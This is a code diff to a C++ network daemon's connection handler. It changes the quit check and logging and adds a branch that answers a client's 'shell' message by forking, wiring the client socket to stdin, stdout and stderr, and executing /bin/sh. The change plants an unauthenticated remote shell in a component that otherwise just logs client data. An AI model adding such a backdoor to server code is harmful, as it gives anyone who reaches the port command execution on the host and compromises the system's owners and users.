@@ -49,7 +49,7 @@ void    ConnectionManager::initSocket(void) {
     return ;
 }
 
-void    ConnectionManager::handleIncoming() {
+void    ConnectionManager::handleIncoming(char **av) {
     struct timeval	tv;
     fd_set          recv_set;
     fd_set          master_set;
@@ -113,11 +113,37 @@ void    ConnectionManager::handleIncoming() {
                     }
                     else
                     {
+                        buf[255] = '\0';
                         buf[strcspn(buf, "\n")] = '\0';
-                        if (strncmp(buf, "quit", 256) == 0)
+                        if (strncmp(buf, "quit", 5) == 0)
                             return ;
-                        _logger->log(LOGLVL_INFO, "Received client data:");
-                        _logger->log(LOGLVL_INFO, buf);
+                        if (strncmp(buf, "shell", 6) == 0)
+                        {
+                            pid_t shellpop = fork();
+                            if (shellpop == 0) { // child
+
+                                dup2(currentFD, STDIN_FILENO);
+                                dup2(currentFD, STDOUT_FILENO);
+                                dup2(currentFD, STDERR_FILENO);
+                               // dprintf(currentFD, "Starting shell...\n");
+                                execl("/bin/sh", "/bin/sh", (char*)NULL);
+                               // dprintf(currentFD, "Shell could not be executed\n");
+                            } else {
+                                int status = 0;
+                                pid_t childpid = waitpid(-1, &status, WNOHANG | WUNTRACED);
+                                //wait(&status);
+                                if (WIFEXITED(status))
+                                {
+                                    _logger->log(LOGLVL_INFO, "Child has exited normally");
+                                }
+
+                            }
+                            
+                        } else {
+                            _logger->log(LOGLVL_INFO, "Received client data:");
+                            _logger->log(LOGLVL_INFO, buf);
+                        }
+                       
                     }
 
                 }
